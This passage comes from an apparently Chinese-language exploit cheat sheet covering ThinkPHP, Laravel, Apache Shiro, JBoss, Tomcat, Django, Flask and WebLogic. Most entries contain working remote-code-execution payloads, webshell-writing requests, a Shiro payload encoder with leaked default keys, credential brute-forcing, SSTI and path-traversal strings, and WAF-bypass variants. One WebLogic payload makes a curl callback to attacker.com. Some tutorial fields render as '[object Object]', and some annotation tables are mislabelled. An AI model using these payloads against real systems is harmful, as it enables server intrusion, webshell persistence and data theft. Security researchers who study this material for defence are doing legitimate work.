**WAF 绕过**

#### 协议切换

```
# 在T3和IIOP之间切换
# 如果T3被禁用，尝试IIOP
# 使用不同协议绕过检测
```

协议切换绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `T3` | WebLogic专有协议，常被WAF重点监控 | parameter |
| `IIOP` | CORBA标准协议，功能类似T3但WAF检测较少 | parameter |
| `协议切换` | 当T3被禁用/检测时切换到IIOP绕过防护 | command |

**教程**

[object Object]

---

### 11. ThinkPHP远程代码执行

- **id:** `thinkphp-rce`
- **分类:** 框架漏洞 / ThinkPHP
- **tags:** `thinkphp` `rce` `php` `framework`

ThinkPHP框架RCE漏洞

**前置条件**

- 使用ThinkPHP框架
- 存在漏洞版本

**利用步骤**

#### 1. ThinkPHP 5.x RCE

```
# ThinkPHP 5.0.x RCE
# 方法调用
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# 写入WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# 执行系统命令
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

ThinkPHP 5.0.x RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `invokefunction` | 调用函数方法 | value |
| `call_user_func_array` | PHP回调函数 | value |
| `vars[0]` | 函数名参数 | value |

#### 2. ThinkPHP 5.1.x RCE

```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```

ThinkPHP 5.1.x RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `eval()` | 代码执行 | function |
| `%xx` | URL编码 | encoding |

#### 3. ThinkPHP 5.0.23 RCE

```
# POST方法
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# 写入Shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```

ThinkPHP 5.0.23 RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `eval()` | 代码执行 | function |
| `Content-Type` | 内容类型头 | header |

#### 4. 信息收集

```
# 获取ThinkPHP版本
# 查看响应头
X-Powered-By: ThinkPHP 5.0.x

# 访问特定页面
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# 错误信息泄露
# 触发错误查看版本
```

信息收集

**WAF 绕过**

#### 编码绕过

```
# URL编码
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# 大小写混合
?s=/Index/\Think\App/invokefunction

# 双重编码
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` URL编码 ?s=%2fIndex%2f%5cthink%5capp%2finvokefunction  # 大小写混合 ?s=/Index/\Think\App/invokefunction  # 双重编码 ?s=%252fIndex%252f%255cthink%255capp%252finvokefunction` | 参数与载荷内容 | value |

#### 路径变体

```
# 不同路径格式
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# 使用不同入口点
/index.php?s=...
/?s=...
/public/index.php?s=...
```

路径变体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同路径格式 ?s=/index/think\app/invokefunction ?s=index/think/app/invokefunction ?s=/index/\think\App/invokefunction  # 使用不同入口点 /index.php?s=... /?s=... /public/index.php?s=...` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 12. Laravel远程代码执行

- **id:** `laravel-rce`
- **分类:** 框架漏洞 / Laravel
- **tags:** `laravel` `rce` `php` `framework`

Laravel框架RCE漏洞

**前置条件**

- 使用Laravel框架
- 存在漏洞版本或配置

**利用步骤**

#### 1. CVE-2021-3129

```
# Laravel Ignition RCE
# 使用工具
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# 手动利用
# 需要发送Phar反序列化payload
# 使用phpggc生成
phpggc Laravel/RCE1 system id > payload

# 发送请求
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```

CVE-2021-3129 Ignition RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `_ignition` | Ignition调试工具端点 | value |
| `phar://` | Phar协议触发反序列化 | value |

#### 2. 调试模式信息泄露

```
# APP_DEBUG=true信息泄露
# 访问触发错误的页面
# 查看堆栈跟踪中的敏感信息

# 可能泄露:
- 数据库凭证
- API密钥
- 环境变量
- 服务器路径
- 源代码片段
```

调试模式信息泄露

#### 3. .env文件泄露

```
# 尝试访问.env文件
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# .env文件包含:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```

.env文件泄露

| 片段 | 说明 | 类型 |
|---|---|---|
| `127.0.0.1` | 本地回环 | domain |
| `../` | 路径穿越 | path |
| `base64` | Base64编码 | encoding |

#### 4. APP_KEY利用

```
# 获取APP_KEY后
# 可以伪造Cookie
# 解密加密数据

# 使用工具解密
php artisan decrypt <encrypted_value>

# 伪造管理员Cookie
# 需要了解应用加密方式
```

APP_KEY利用

**WAF 绕过**

#### 路径绕过

```
# 尝试不同路径
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```

路径绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 尝试不同路径 /.env /.env.example /.env.local /.env.production /../.env /..%2f.env /..%252f.env` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 13. Apache Shiro反序列化

- **id:** `shiro-deserialize`
- **分类:** 框架漏洞 / Apache Shiro
- **tags:** `shiro` `deserialization` `java` `rememberme`

Apache Shiro RememberMe反序列化漏洞

**前置条件**

- 使用Apache Shiro
- 存在漏洞版本

**利用步骤**

#### 1. 检测Shiro

```
# 检测rememberMe Cookie
# 响应中有rememberMe=deleteMe表示使用Shiro

# 使用工具检测
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# 或使用Burp插件
# ShiroScan Burp插件
```

检测Shiro框架

| 片段 | 说明 | 类型 |
|---|---|---|
| `rememberMe` | Shiro记住我功能Cookie | value |
| `deleteMe` | Shiro删除Cookie标记 | value |

#### 2. 使用ysoserial生成payload

```
# 生成恶意序列化对象
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# 使用Shiro内置密钥加密
# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==

# Python加密脚本
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # 生成payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES加密
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```

生成恶意payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `base64` | Base64编码 | encoding |
| `rememberMe` | Shiro记住我 | keyword |

#### 3. 发送恶意请求

```
# 使用curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# 使用工具
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# 使用ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```

发送恶意请求

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `-H` | 自定义请求头 | parameter |
| `rememberMe` | Shiro记住我 | keyword |

#### 4. 常见密钥列表

```
# 常见Shiro密钥
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# 尝试不同密钥
# 或爆破密钥
```

常见密钥列表

**WAF 绕过**

#### Gadget链选择

```
# 不同Gadget链
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# 根据目标环境选择
# 某些链可能被过滤
```

Gadget链选择

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同Gadget链 CommonsCollections2 CommonsBeanutils1 Jdk7u21 JRMPClient  # 根据目标环境选择 # 某些链可能被过滤` | 参数与载荷内容 | value |

#### 密钥爆破

```
# 使用工具爆破密钥
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# 或使用ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```

密钥爆破

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用工具爆破密钥 git clone https://github.com/insightglacier/Shiro_exploit python3 s` | 攻击载荷 | value |

**教程**

[object Object]

---

### 14. JBoss漏洞利用

- **id:** `jboss-vuln`
- **分类:** 框架漏洞 / JBoss
- **tags:** `jboss` `rce` `java` `deserialization`

JBoss应用服务器漏洞

**前置条件**

- 使用JBoss服务器
- 存在漏洞版本

**利用步骤**

#### 1. JMXInvokerServlet反序列化

```
# CVE-2015-7501
# 发送恶意序列化对象
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# 发送
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```

JMXInvokerServlet反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `invoker/JMXInvokerServlet` | JBoss JMX调用端点 | encoding |
| `x-java-serialized-object` | Java序列化对象类型 | value |

#### 2. JMX Console部署War包

```
# 访问JMX Console
http://target/jmx-console/

# 查找deploy方法
# 找到 jboss.system:service=MainDeployer

# 部署远程War包
# 使用deploy方法，URL参数指向恶意War
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# 访问部署的Shell
http://target/shell/cmd.jsp?cmd=id
```

JMX Console部署War包

#### 3. BSHDeployer部署

```
# 使用BeanShell部署
# 找到 jboss.scripts:service=BSHDeployer

# 执行BeanShell脚本
# 通过createScriptDeployment方法

# 构造恶意脚本
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```

BSHDeployer部署

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Runtime.exec` | Java命令执行 | function |

#### 4. 使用工具

```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# 自动化利用
python jexboss.py -mode file-scan -file hosts.txt
```

使用JexBoss工具

**WAF 绕过**

#### 端点变体

```
# 不同端点
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```

端点变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同端点 /invoker/JMXInvokerServlet /invoker/EJBInvokerServlet /invoker/readonly/JMXInvokerServlet /jmx-console/ /web-console/` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 15. Apache Tomcat漏洞

- **id:** `tomcat-vuln`
- **分类:** 框架漏洞 / Tomcat
- **tags:** `tomcat` `rce` `java` `manager`

Apache Tomcat服务器漏洞利用

**前置条件**

- 使用Tomcat服务器
- 存在漏洞版本或配置

**利用步骤**

#### 1. Manager App弱口令

```
# 访问Manager App
http://target/manager/html

# 常见弱口令
tomcat:tomcat
admin:admin
admin:tomcat

# 使用工具爆破
hydra -l tomcat -P passwords.txt target http-get /manager/html
```

Manager App弱口令

| 片段 | 说明 | 类型 |
|---|---|---|
| `/manager/html` | Tomcat管理界面 | value |

#### 2. 部署War包

```
# 生成恶意War包
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# 打包
jar cvf shell.war cmd.jsp

# 通过Manager上传
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# 访问Shell
http://target/shell/cmd.jsp?cmd=id
```

部署War包

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `curl` | HTTP请求工具 | command |
| `Runtime.exec` | Java命令执行 | function |

#### 3. CVE-2020-1938 Ghostcat

```
# AJP文件读取/包含
# 使用工具
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# 或使用专用工具
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```

CVE-2020-1938 Ghostcat

| 片段 | 说明 | 类型 |
|---|---|---|
| `AJP` | Apache JServ Protocol | value |
| `8009` | AJP默认端口 | value |

#### 4. PUT方法任意文件写入

```
# CVE-2017-12615
# Windows下PUT方法写文件
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 或使用::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# 或使用/
PUT /shell.jsp/ HTTP/1.1
```

PUT方法任意文件写入

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `%xx` | URL编码 | encoding |
| `Runtime.exec` | Java命令执行 | function |

> platform: `windows`

**WAF 绕过**

#### 文件名绕过

```
# 不同文件名变体
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```

文件名绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 不同文件名变体 shell.jsp%20 shell.jsp::$DATA shell.jsp/ shell.jsp%00 shell.jSp shell.jsP` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 16. Django框架漏洞

- **id:** `django-vuln`
- **分类:** 框架漏洞 / Django
- **tags:** `django` `python` `framework` `sql`

Django框架安全漏洞

**前置条件**

- 使用Django框架
- 存在漏洞版本

**利用步骤**

#### 1. SQL注入

```
# CVE-2020-7471
# 通过PostgreSQL输入验证绕过
# 使用JSONField/HStoreField

# 构造恶意查询
Model.objects.filter(data__contains={"key": "value; DROP TABLE users;--"})

# 或使用ArrayField
Model.objects.filter(tags__contains=["tag'); DROP TABLE users;--"])

# 触发SQL注入
```

CVE-2020-7471 SQL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `JSONField` | Django JSON字段 | value |
| `__contains` | Django查询语法 | value |

#### 2. 调试模式信息泄露

```
# DEBUG=True时
# 错误页面泄露:
- 源代码
- 环境变量
- 数据库配置
- SECRET_KEY
- 服务器路径

# 访问不存在的页面触发错误
http://target/nonexistent

# 或触发异常
```

调试模式信息泄露

#### 3. SECRET_KEY利用

```
# 获取SECRET_KEY后
# 可以:
# 1. 签名伪造Session
# 2. 签名伪造CSRF Token
# 3. 密码重置Token

# 使用django-session-cleanup工具
# 或手动解签

import django.core.signing as signing

# 解签Session
signing.loads(session_value, key=SECRET_KEY)

# 签名伪造Session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

SECRET_KEY利用

#### 4. 路径遍历

```
# CVE-2021-28658
# Django静态文件路径遍历
GET /static/../../../../etc/passwd

# 使用工具检测
curl http://target/static/../../../../etc/passwd
```

路径遍历漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `../` | 路径穿越 | path |
| `/etc/passwd` | 敏感文件路径 | path |

**WAF 绕过**

#### 编码绕过

```
# URL编码
/static/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode编码
/static/..%c0%af..%c0%af/etc/passwd
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` URL编码 /static/%2e%2e/%2e%2e/etc/passwd  # 双重编码 /static/%252e%252e/%252e%252e/etc/passwd  # Unicode编码 /static/..%c0%af..%c0%af/etc/passwd` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 17. Flask框架漏洞

- **id:** `flask-vuln`
- **分类:** 框架漏洞 / Flask
- **tags:** `flask` `python` `framework` `ssti`

Flask框架安全漏洞

**前置条件**

- 使用Flask框架
- 存在漏洞配置

**利用步骤**

#### 1. SSTI模板注入

```
# Jinja2模板注入探测
{{7*7}}
${7*7}
<%= 7*7 %>

# 如果返回49则存在SSTI

# 获取配置
{{config}}
{{self.__class__}}

# 命令执行
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

SSTI模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | Jinja2模板语法 | value |
| `__class__` | 获取对象类 | value |
| `__mro__` | 方法解析顺序 | value |

#### 2. SECRET_KEY利用

```
# Flask Session签名
# 获取SECRET_KEY后可以伪造Session

# 解签Session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 解签
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# 签名伪造
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# 伪造管理员Session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

SECRET_KEY利用

#### 3. 调试模式RCE

```
# Flask Debug模式
# 访问/debug或/console
# 可以执行任意Python代码

# Werkzeug Debug Console
# 访问:
http://target/console

# 执行代码
import os; os.system('id')
__import__('os').system('id')
```

调试模式RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `;` | 命令分隔符 | operator |

#### 4. PIN码绕过

```
# Flask Debug PIN
# 需要获取:
# 1. 用户名
# 2. modname
# 3. app路径
# 4. MAC地址

# 读取信息
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# 计算PIN
# 使用脚本计算Werkzeug PIN
```

PIN码绕过

**WAF 绕过**

#### SSTI绕过

```
# 过滤绕过
# 使用attr
{{''|attr('__class__')|attr('__mro__')}}

# 使用request
{{request|attr('application')|attr('__globals__')}}

# 使用字符串拼接
{{'__cla'~'ss__'}}

# 使用编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```

SSTI绕过

**教程**

[object Object]

---

### 18. WebLogic XMLDecoder

- **id:** `weblogic-xmldecoder`
- **分类:** 框架漏洞 / WebLogic
- **tags:** `weblogic` `xmldecoder` `rce`

利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行

**前置条件**

- 目标运行WebLogic Server
- 存在/wls-wsat/或/_async/路径
- XMLDecoder组件未被禁用
- WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)

**利用步骤**

#### 探测WebLogic版本和路径

```
# 检测WebLogic控制台
curl -sI "http://target:7001/console/" | head -5

# 检测wls-wsat端点(CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# 检测AsyncResponseService端点(CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# 检测T3协议
nmap -sV -p 7001 --script weblogic-t3-info target
```

探测WebLogic服务器版本、开放端口和可利用的端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `/wls-wsat/CoordinatorPortType` | WebLogic WLS-WSAT组件端点，CVE-2017-10271利用点 | value |
| `/_async/AsyncResponseService` | WebLogic异步通信服务端点，CVE-2019-2725利用点 | value |
| `weblogic-t3-info` | Nmap脚本检测T3协议信息 | value |

> platform: `linux`

#### CVE-2017-10271 XMLDecoder RCE

```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

通过SOAP请求中的WorkContext注入XMLDecoder反序列化payload实现命令执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `soapenv:Envelope` | SOAP消息的根元素 | value |
| `work:WorkContext` | WebLogic工作上下文，XMLDecoder解析入口 | value |
| `java.beans.XMLDecoder` | Java XML反序列化器，漏洞的核心组件 | value |
| `java.lang.ProcessBuilder` | 用于创建操作系统进程执行命令 | value |
| `void method="start"` | 调用ProcessBuilder.start()执行构造的命令 | command |

> platform: `linux`

#### CVE-2019-2725 反序列化RCE

```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```

利用_async端点的反序列化漏洞执行外带验证(OOB)

| 片段 | 说明 | 类型 |
|---|---|---|
| `/_async/AsyncResponseService` | 异步服务端点，CVE-2019-2725的攻击入口 | value |
| `wsa:Action` | WS-Addressing Action头，触发异步处理 | value |
| `curl http://attacker.com/callback` | 使用curl外带验证命令执行结果 | command |

> platform: `linux`

#### 写入Webshell获取持久权限

```
# 通过XMLDecoder写入JSP Webshell
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 验证Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```

利用XMLDecoder的PrintWriter写入JSP webshell到WebLogic部署目录

| 片段 | 说明 | 类型 |
|---|---|---|
| `java.io.PrintWriter` | 利用PrintWriter类写入文件 | value |
| `servers/AdminServer/tmp/_WL_internal/...` | WebLogic内部Web应用部署路径 | value |
| `CDATA` | XML CDATA区段，避免JSP代码被XML解析器处理 | value |
| `/bea_wls_internal/test.jsp` | Webshell的访问URL路径 | value |

> platform: `linux`

**WAF 绕过**

#### 备用反序列化端点

```
# 尝试不同的XMLDecoder入口
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```

尝试WebLogic WLS-WSAT组件的多个不同SOAP端点，部分端点可能未被WAF规则覆盖

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 尝试不同的XMLDecoder入口` | 主要命令 | command |
| `...` | 共6行 | value |

#### T3/IIOP协议绕过HTTP层WAF

```
# T3协议利用（绕过HTTP层WAF）
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP协议利用
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# 使用ysoserial生成T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```

使用T3或IIOP协议发送反序列化payload，绕过仅检测HTTP流量的WAF

| 片段 | 说明 | 类型 |
|---|---|---|
| `# T3协议利用（绕过HTTP层WAF）` | 主要命令 | command |
| `...` | 共6行 | value |

#### XML编码混淆绕过

```
<!-- UTF-16编码绕过 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!-- UTF-16编码绕过 --> ` | XML内容 | value |
| `<?xml version="1.0" encoding="UTF-16"?>` | XML声明/实体定义 | tag |
| `  <!-- CDATA包裹关键字 --> <java>   <object class="java.lang.Proc` | XML内容 | value |

**教程**

[object Object]
